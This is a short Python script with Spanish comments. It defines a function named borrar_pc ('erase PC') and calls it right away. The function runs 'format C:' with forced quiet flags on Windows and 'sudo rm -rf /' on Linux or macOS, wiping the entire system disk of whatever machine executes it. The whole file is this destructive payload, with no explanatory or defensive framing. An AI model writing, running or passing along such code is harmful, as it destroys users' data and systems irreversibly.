import os

def borrar_pc():
    if os.name == 'nt':  # Verificar si el sistema operativo es Windows
        os.system('format C: /fs:NTFS /q /y')  # Borrar el disco C: en Windows
    elif os.name == 'posix':  # Verificar si el sistema operativo es Linux o macOS
        os.system('sudo rm -rf /')  # Borrar todo el sistema de archivos en Linux o macOS

borrar_pc()